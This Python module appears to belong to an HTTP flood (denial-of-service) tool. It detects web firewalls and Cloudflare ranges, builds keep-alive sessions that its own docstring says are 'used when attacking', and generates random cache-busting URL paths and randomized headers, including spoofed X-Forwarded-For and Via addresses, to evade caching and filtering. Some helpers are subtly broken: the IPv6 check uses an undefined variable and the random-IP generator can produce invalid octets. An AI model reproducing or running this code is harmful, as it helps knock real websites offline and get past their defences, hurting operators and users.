# import modules
import os, requests, socket
from random import randint, choice, shuffle, random
from string import ascii_letters, digits, ascii_uppercase
from netaddr import IPAddress, IPNetwork
from urllib.parse import urlparse
from src.core import *

ualist = []
with open('src/lists/useragents.txt', 'r') as uafile:
    [ualist.append(line.strip('\n')) for line in uafile.readlines()]

reflist = []
with open('src/lists/referers.txt', 'r') as reffile:
    [reflist.append(line.strip('\n')) for line in reffile.readlines()]

orlist = []
with open('src/lists/open redirects.txt', 'r') as orfile:
    [orlist.append(line.strip('\n')) for line in orfile.readlines()]

keywords = []
with open('src/lists/keywords.txt', 'r') as kwfile:
    [keywords.append(line.strip('\n')) for line in kwfile.readlines()]

cf_ips = []
with open('src/lists/cf_ips.txt', 'r') as cffile:
    [cf_ips.append(line.rstrip()) for line in cffile.readlines()]

def fwDetect(url):
    fwdict = {
        'cloudflare': 'Cloudflare Inc', 'cloudflare-nginx': 'Cloudflare Inc', 'cf-ray': 'Cloudflare Inc',
        'sucuri/cloudproxy': 'Sucuri',
        'wordfence': 'WordFence',
        'akamai': 'Akamai',
        'comodo': 'Comodo',
        'incapsula': 'Incapsula',
        'mod_security': 'ModSecurity',
        '360': '360 Web Application Firewall'
    }

    try:
        for i in cf_ips: # first we check if its CF only
            if IPAddress(socket.gethostbyname(urlparse(args['target']).netloc)) in IPNetwork(i):
                return 'Cloudflare Inc'

        req = requests.get(url)
        server_header = req.headers.get('server')
        firewall = server_header if server_header.lower() in fwdict.keys() else None # first we try it with HTTP header checking
        if firewall is None: # then we try it by looking through the webpage contents
            for fw_ident, fw_name in fwdict.items():
                if fw_ident in req.text.lower(): return fw_name
                else: pass

        if firewall is None: # if its still None, we try HTTP response code checking
            if req.status_code == 406 or req.status_code == 501: firewall = 'ModSecurity'
            elif req.status_code == 999: firewall = 'WebKnight'
            elif req.status_code == 419: firewall = 'F5 BIG IP'
            else: firewall = 'Unknown' # last resort
    except: return 'Exception while checking'
    return firewall

def isIPv4(ip):
    '''
    Function to check if a IP is a valid IPv4 address
    '''

    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts)

def isIPv6(ip):
    '''
    Function to check if a IP is a valid IPv6 address'''

    try:
        socket.inet_pton(socket.AF_INET6, ipv6Address)

        return True
    except:
        return False

def isCF(ip): # credits to Wreckuests
    '''
    Function to check if a IP is in cloudflare's ranges
    '''

    for i in cf_ips:
        if (IPAddress(ip) in IPNetwork(i)):
            return True

def calcbestworkers():
    ''' 
    Function to calculate the best workers, in terms of rps
    '''

    sorted_dict = {}
    unsorted_dict = dict(sorted(Core.infodict.items(), key=lambda x:x[1]['req_sent'], reverse=True))
    [sorted_dict.update({x: y}) for x, y in unsorted_dict.items()]

    return sorted_dict

def clear():
    ''' 
    Simple function to clear screen
    '''

    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass

def randip():
    '''
    Function to generate random IPv4 address
    '''

    p1, p2, p3, p4 = str(randint(0, 256)),str(randint(0, 256)),str(randint(0, 256)),str(randint(0, 256))

    return f'{p1}.{p2}.{p3}.{p4}'

def randstr(strlen, chars=ascii_letters):
    '''
    Function to generate a random string
    '''
    
    return ''.join(choice(chars) for _ in range(strlen))

class HTTPAdapter(requests.adapters.HTTPAdapter):
    '''
    HTTP adapter which allows socket modification
    '''

    # stolen from stackoverflow xd
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapter, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapter, self).init_poolmanager(*args, **kwargs)

def createsession():
    '''
    Function that creates a requests session object used when attacking
    '''

    adapter = HTTPAdapter(socket_options=[
        (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1), 
        (socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 5), 
        (socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5), 
        (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    ])

    session = requests.session()
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    session.allow_redirects = False
    session.timeout = (5, 2)
    session.trust_env = False
    if Core.proxy != None:
        proxurl = f'{Core.proxy_type.lower()}{"h" if Core.proxy_resolve is True else ""}://{Core.proxy_user if Core.proxy_user != None else ""}{":"+Core.proxy_passw if Core.proxy_passw != None else ""}{"@" if Core.proxy_user != None else "@" if Core.proxy_passw != None else ""}{Core.proxy}'
        session.proxies = { 'http': proxurl, 'https': proxurl }
    else: session.proxies = {}

    return session

def buildblock(url):
    '''
    Function to generate a block that gets appened to the target url
    '''
    
    if Core.bypass_cache:
        block = '' if url != None and url.endswith('/') else '/' if url != None and not url.endswith('/') else ''

        block += randstr(randint(5, 10))
        for _ in range(randint(2, 10)):
            if randint(0, 1) == 1: block += f'/{randstr(randint(5, 10))}'
            else: block += f'/{randstr(randint(5, 10), chars=digits)}'
        
        block += f'?q={choice(keywords).replace(" ", "+")}'

        for _ in range(randint(2, 9)):
            if randint(0, 1) == 1: block += f'&{randstr(randint(5, 10))}={choice(keywords).replace(" ", "+")}'
            else: block += f'&{choice(keywords).replace(" ", "+")}={choice(keywords).replace(" ", "+")}'
        
        return block
    else:
        return ''

def buildheaders(url, useragent, referer):
    '''
    Function to generate randomized headers
    '''

    reflist.append(url+buildblock(url))

    cache_controls = ['no-cache', 'max-age=0']
    accept_encodings = ['*', 'identity', 'gzip', 'deflate']
    accept_charsets = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
    content_types = ['multipart/form-data', 'application/x-url-encoded']
    accepts = ['*/*', 'application/json', 'text/html', 'application/xhtml+xml', 'application/xml', 'image/webp', 'image/*']
    # we shuffle em
    for toshuffle in [cache_controls, accept_encodings, accept_charsets, content_types, accepts]:
        shuffle(toshuffle)
    
    if randint(0,1) == 1: headers = { 'X-Requested-With': 'XMLHttpRequest'}
    else: headers = { 'User-Agent': choice(ualist) if useragent == None else useragent }

    headers.update({
        'Cache-Control': ', '.join(cache_controls[:randint(1,len(cache_controls))]),
        'Accept-Encoding': ', '.join(accept_encodings[:randint(1,len(accept_encodings))]),
        'Accept': ', '.join(accepts[:randint(1,len(accepts))])
    })

    # "random" headers
    if randint(0,1) == 1:
        charsets = f'{accept_charsets[0]},{accept_charsets[1]};q={str(round(random(), 1))},*;q={str(round(random(), 1))}'
        headers.update({'Accept-Charset': charsets})

    if randint(0,1) == 1:
        rand_referer = choice(reflist)
        headers.update({'Referer': rand_referer+buildblock(rand_referer) if referer == None else referer})
    
    if randint(0,1) == 1:
        headers.update({'Content-Type': choice(content_types)})
    
    if randint(0,1) == 1:
        headers.update({'Cookie': randstr(randint(60, 90), chars=ascii_uppercase+str(digits))})
    
    if randint(0,1) == 1:
        spoofip = randip()
        headers.update({
            'Via': spoofip,
            'X-Forwarded-For': spoofip
        })
    
    return headers